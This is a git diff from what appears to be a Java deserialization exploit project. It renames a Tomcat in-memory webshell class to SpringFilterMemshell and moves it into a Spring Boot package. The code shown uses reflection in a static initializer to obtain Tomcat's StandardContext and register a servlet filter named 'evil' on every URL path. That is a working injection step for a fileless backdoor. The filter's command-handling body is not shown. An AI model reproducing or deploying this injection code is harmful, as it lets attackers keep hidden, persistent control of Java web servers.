@@ -1,19 +1,17 @@
-package xyz.eki.marshalexp.memshell;
+package xyz.eki.marshalexp.memshell.SpringBoot.Filter;
 
 import org.apache.catalina.core.StandardContext;
 import org.apache.tomcat.util.descriptor.web.FilterDef;
 import org.apache.tomcat.util.descriptor.web.FilterMap;
 
 import javax.servlet.*;
-import javax.servlet.http.HttpServletRequest;
 import java.io.ByteArrayOutputStream;
 import java.io.IOException;
 import java.io.InputStream;
 import java.lang.reflect.Field;
 import java.lang.reflect.Method;
-import java.util.Scanner;
 
-public class MFilter implements Filter{
+public class SpringFilterMemshell implements Filter{
         static {
             try {
                 Class WebappClassLoaderBaseClz = Class.forName("org.apache.catalina.loader.WebappClassLoaderBase");
@@ -26,12 +24,14 @@ public class MFilter implements Filter{
                 StandardContext standardContext = (StandardContext) getContext.invoke(resources, null);
                 //System.out.println(standardContext);
 
-                Filter filter = MFilter.class.newInstance();
+                Filter filter = SpringFilterMemshell.class.newInstance();
+
                 FilterDef filterDef = new FilterDef();
                 filterDef.setFilterName("evil");
                 filterDef.setFilterClass(filter.getClass().getName());
                 filterDef.setFilter(filter);
                 standardContext.addFilterDef(filterDef);
+
                 FilterMap filterMap = new FilterMap();
                 filterMap.setFilterName("evil");
                 filterMap.addURLPattern("/*");
@@ -44,7 +44,7 @@ public class MFilter implements Filter{
                 t.printStackTrace();
             }
         }
-    public MFilter(){
+    public SpringFilterMemshell(){
         System.out.println("created");
     }
     @Override
